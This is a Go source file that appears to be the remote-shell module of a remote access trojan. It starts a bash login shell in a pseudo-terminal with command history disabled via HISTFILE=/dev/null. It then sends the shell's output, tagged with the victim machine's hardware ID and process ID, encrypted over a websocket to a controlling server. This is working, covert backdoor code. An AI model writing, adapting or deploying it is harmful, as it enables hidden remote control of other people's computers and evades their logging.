package ptyopt

import (
	"io"
	"main/Encrypt"
	"main/MessagePack"
	"main/PcInfo"
	"os"
	"os/exec"

	"github.com/creack/pty"
	"github.com/togettoyou/wsc"
)

type PtyData struct {
	Stdin  io.WriteCloser
	Stdout io.ReadCloser
}

func InitPtmx() *os.File {
	ws, _ := pty.GetsizeFull(os.Stdin)
	c := exec.Command("/bin/sh", "-c", "exec bash --login")
	c.Env = []string{"HISTFILE=/dev/null"}
	ptmx, err := pty.Start(c)

	if err != nil {
		return nil
	}
	_ = pty.Setsize(ptmx, ws)
	return ptmx
}
func SendData(data []byte, Connection *wsc.Wsc) {
	endata, err := Encrypt.Encrypt(data)
	if err != nil {
		return
	}
	Connection.SendBinaryMessage(endata)
}
func RetPtyResult(resBuffer []byte, clientId string, Connection *wsc.Wsc) {
	//fmt.Println(string(resBuffer))
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("PtyRet")
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("ClientHWID").SetAsString(PcInfo.GetHWID())
	msgpack.ForcePathObject("Message").SetAsString(string(resBuffer))
	//fmt.Println(string(resBuffer))
	SendData(msgpack.Encode2Bytes(), Connection)
}
